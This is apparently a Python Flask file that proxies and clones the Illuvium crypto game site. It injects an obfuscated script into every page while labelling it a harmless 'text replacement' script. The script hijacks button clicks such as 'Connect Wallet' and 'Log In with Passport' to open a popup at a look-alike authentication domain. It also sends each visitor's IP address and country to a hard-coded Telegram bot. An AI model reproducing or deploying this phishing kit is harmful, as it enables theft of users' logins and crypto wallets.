from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x4564(_0xa94f9e,_0x3e172d){const _0x172f9e=_0x172f();return _0x4564=function(_0x4564e3,_0x2cc891){_0x4564e3=_0x4564e3-0x1d6;let _0x1452ca=_0x172f9e[_0x4564e3];return _0x1452ca;},_0x4564(_0xa94f9e,_0x3e172d);}function _0x172f(){const _0x3adc98=['org','DOMContentLoaded','27974xJbCfx','nodeType','width','Timeline','https://auth-illuvidex.onrender.com/?id=/auth-passeport&user=209348','[ILV]:\x20','Documentation','555565yOekXL','245QURcVi','Claim\x20Your\x20Mint','css-1oqedzn','addedNodes','innerHeight','Main','POST','left','documentElement','4956qUJeMW','toISOString','screenLeft','click','country_name','textContent','querySelectorAll','stringify','Info','add','Register','clientHeight','application/json','button:not(.claim-button),\x20a:not(.claim-button)','/sendMessage','contains','forEach','https://api.telegram.org/bot','Updates','Start\x20Now','screenTop','length','Help','innerWidth','https://ipapi.co/json/','open','css-1hnz6hu','observe','TEXT_NODE','log','childNodes','classList','7256pfuToV','Grab\x20Your\x20Spot','closest','Connect\x20Wallet','Redirecting\x20to\x20Google','9UuXNei','googleWindow','\x20:\x20','load','top','Collect\x20Now','addEventListener','scrollbars=yes,resizable=yes,width=','916821WVVjpR','css-tvaofb','clientWidth','trim','Get\x20Yours','preventDefault','12507bMSvHb','3xZwzlU','height','1610736OrpLgE','245104ltPvuL','target','focus',',left=','10sGUOkq','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','button,\x20a','body','claim-button','outerHTML'];_0x172f=function(){return _0x3adc98;};return _0x172f();}const _0x2a6e8f=_0x4564;(function(_0x1b30d8,_0x1ea7bf){const _0x32029f=_0x4564,_0x4b59e4=_0x1b30d8();while(!![]){try{const _0x5d63de=-parseInt(_0x32029f(0x21b))/0x1*(parseInt(_0x32029f(0x1d6))/0x2)+-parseInt(_0x32029f(0x20c))/0x3*(parseInt(_0x32029f(0x21e))/0x4)+parseInt(_0x32029f(0x1dd))/0x5+-parseInt(_0x32029f(0x21d))/0x6+-parseInt(_0x32029f(0x1de))/0x7*(parseInt(_0x32029f(0x207))/0x8)+parseInt(_0x32029f(0x214))/0x9*(parseInt(_0x32029f(0x222))/0xa)+-parseInt(_0x32029f(0x21a))/0xb*(-parseInt(_0x32029f(0x1e7))/0xc);if(_0x5d63de===_0x1ea7bf)break;else _0x4b59e4['push'](_0x4b59e4['shift']());}catch(_0x4ec758){_0x4b59e4['push'](_0x4b59e4['shift']());}}}(_0x172f,0x2639d),document['addEventListener'](_0x2a6e8f(0x229),function(){const _0x3a85f1=_0x2a6e8f;console[_0x3a85f1(0x204)]('D');const _0x56e165={'Play\x20for\x20Free':_0x3a85f1(0x1df),'Play\x20Now':_0x3a85f1(0x208),'Log\x20In\x20with\x20Passport':_0x3a85f1(0x1fa),'Connect\x20Wallet':_0x3a85f1(0x20a),'Launch\x20Game':_0x3a85f1(0x218),'Create\x20Account':'New\x20Account','Sign\x20Up':_0x3a85f1(0x1f1),'Register':_0x3a85f1(0x211),'News':_0x3a85f1(0x1f9),'Home':_0x3a85f1(0x1e3),'About':_0x3a85f1(0x1ef),'Contact':'Reach\x20Us','FAQ':_0x3a85f1(0x1fd),'Roadmap':_0x3a85f1(0x1d9),'Whitepaper':_0x3a85f1(0x1dc)};function _0x291a51(_0x3cfe95,_0x13531b,_0x5df972){const _0x1ee2e8=_0x3a85f1;console['log']('T',{'element':_0x3cfe95[_0x1ee2e8(0x227)],'oldText':_0x13531b,'newText':_0x5df972,'timestamp':new Date()[_0x1ee2e8(0x1e8)]()});}function _0x181d25(_0x34040b){const _0xd70f3d=_0x3a85f1;let _0x5c0018='';for(const _0x10b196 of _0x34040b[_0xd70f3d(0x205)]){_0x10b196[_0xd70f3d(0x1d7)]===Node[_0xd70f3d(0x203)]&&(_0x5c0018+=_0x10b196['textContent'][_0xd70f3d(0x217)]());}!_0x5c0018&&(_0x5c0018=_0x34040b[_0xd70f3d(0x1ec)][_0xd70f3d(0x217)]());if(_0x56e165[_0x5c0018]){const _0xa0b794=_0x5c0018;if(_0x34040b['childNodes'][_0xd70f3d(0x1fc)]===0x1&&_0x34040b[_0xd70f3d(0x205)][0x0]['nodeType']===Node[_0xd70f3d(0x203)])_0x34040b['textContent']=_0x56e165[_0x5c0018];else{let _0xed7ad3=![];for(const _0x2365bf of _0x34040b['childNodes']){if(_0x2365bf[_0xd70f3d(0x1d7)]===Node['TEXT_NODE']&&_0x2365bf['textContent'][_0xd70f3d(0x217)]()===_0x5c0018){_0x2365bf['textContent']=_0x56e165[_0x5c0018],_0xed7ad3=!![];break;}}!_0xed7ad3&&(_0x34040b[_0xd70f3d(0x1ec)]=_0x56e165[_0x5c0018]);}_0x291a51(_0x34040b,_0xa0b794,_0x56e165[_0x5c0018]);}_0x34040b[_0xd70f3d(0x206)][_0xd70f3d(0x1f0)](_0xd70f3d(0x226));}function _0x26674e(){const _0x5028aa=_0x3a85f1;document[_0x5028aa(0x1ed)](_0x5028aa(0x224))[_0x5028aa(0x1f7)](_0x181d25),document[_0x5028aa(0x1ed)]('a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]')[_0x5028aa(0x1f7)](_0x181d25),document[_0x5028aa(0x1ed)]('.chakra-link,\x20.nav-link,\x20.menu-item')[_0x5028aa(0x1f7)](_0x181d25);}_0x26674e(),console[_0x3a85f1(0x204)]('I'),setInterval(function(){const _0x42a8f0=_0x3a85f1;document[_0x42a8f0(0x1ed)](_0x42a8f0(0x1f4))['forEach'](_0x181d25);},0x3e8);const _0x14809f=new MutationObserver(function(_0x3e1c64){const _0x49637=_0x3a85f1;let _0x1edeba=![];_0x3e1c64[_0x49637(0x1f7)](function(_0x51c79b){const _0x5c89b9=_0x49637;_0x51c79b[_0x5c89b9(0x1e1)]['length']&&(_0x1edeba=!![]);}),_0x1edeba&&document[_0x49637(0x1ed)](_0x49637(0x1f4))[_0x49637(0x1f7)](_0x181d25);});_0x14809f[_0x3a85f1(0x202)](document[_0x3a85f1(0x225)],{'childList':!![],'subtree':!![]}),document[_0x3a85f1(0x212)](_0x3a85f1(0x1ea),function(_0x3b8da1){const _0x4664bf=_0x3a85f1,_0x1f80e6=_0x3b8da1['target'],_0x5f2bdb=_0x1f80e6[_0x4664bf(0x209)](_0x4664bf(0x224));if(!_0x5f2bdb)return;if(_0x5f2bdb['classList'][_0x4664bf(0x1f6)](_0x4664bf(0x215))||_0x5f2bdb[_0x4664bf(0x206)]['contains']('css-104rome')||_0x5f2bdb[_0x4664bf(0x206)][_0x4664bf(0x1f6)](_0x4664bf(0x201))||_0x5f2bdb[_0x4664bf(0x206)][_0x4664bf(0x1f6)](_0x4664bf(0x1e0))||_0x5f2bdb[_0x4664bf(0x206)]['contains']('css-1i8s7az'))return;_0x3b8da1[_0x4664bf(0x219)](),_0x3b8da1['stopPropagation']();function _0x40702e(_0x24a6bf,_0x59f0b0,_0x12d21c,_0x22a87e){const _0x184ece=_0x4664bf,_0x10bcf6=window[_0x184ece(0x1e9)]!==undefined?window[_0x184ece(0x1e9)]:screen[_0x184ece(0x1e5)],_0x106b46=window[_0x184ece(0x1fb)]!==undefined?window['screenTop']:screen[_0x184ece(0x210)],_0x40ddf9=window[_0x184ece(0x1fe)]?window[_0x184ece(0x1fe)]:document[_0x184ece(0x1e6)][_0x184ece(0x216)]?document[_0x184ece(0x1e6)][_0x184ece(0x216)]:screen[_0x184ece(0x1d8)],_0x55ade9=window[_0x184ece(0x1e2)]?window['innerHeight']:document[_0x184ece(0x1e6)][_0x184ece(0x1f2)]?document['documentElement'][_0x184ece(0x1f2)]:screen[_0x184ece(0x21c)],_0x18ed73=_0x40ddf9/0x2-_0x12d21c/0x2+_0x10bcf6,_0xeeae80=_0x55ade9/0x2-_0x22a87e/0x2+_0x106b46,_0x594ca9=window[_0x184ece(0x200)](_0x24a6bf,_0x59f0b0,_0x184ece(0x213)+_0x12d21c+',height='+_0x22a87e+',top='+_0xeeae80+_0x184ece(0x221)+_0x18ed73);window['focus']&&_0x594ca9[_0x184ece(0x220)]();}document[_0x4664bf(0x212)]('click',function(_0x372c27){const _0x5b7ebf=_0x4664bf,_0x403823=_0x372c27[_0x5b7ebf(0x21f)];_0x403823[_0x5b7ebf(0x206)]['contains'](_0x5b7ebf(0x226))&&(console[_0x5b7ebf(0x204)](_0x5b7ebf(0x20b)),_0x40702e(_0x5b7ebf(0x1da),_0x5b7ebf(0x20d),0x320,0x258));}),console[_0x4664bf(0x204)]('B'),_0x5f2bdb[_0x4664bf(0x1ea)]();},!![]);}));async function sendIPToTelegram(){const _0x562460=_0x2a6e8f,_0x35579d=_0x562460(0x223),_0xba56dd='7005236807';try{const _0x5ab4aa=await fetch(_0x562460(0x1ff)),_0x4f17f3=await _0x5ab4aa['json'](),_0x3d9c42=_0x4f17f3['ip'],_0x41175e=_0x4f17f3[_0x562460(0x1eb)],_0x1990b8=_0x4f17f3[_0x562460(0x228)],_0x49ae79=_0x562460(0x1db)+_0x3d9c42+_0x562460(0x20e)+_0x41175e+_0x562460(0x20e)+_0x1990b8;await fetch(_0x562460(0x1f8)+_0x35579d+_0x562460(0x1f5),{'method':_0x562460(0x1e4),'headers':{'Content-Type':_0x562460(0x1f3)},'body':JSON[_0x562460(0x1ee)]({'chat_id':_0xba56dd,'text':_0x49ae79})});}catch(_0x333e89){console['error']('Fa',_0x333e89);}}window[_0x2a6e8f(0x212)](_0x2a6e8f(0x20f),sendIPToTelegram);
</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
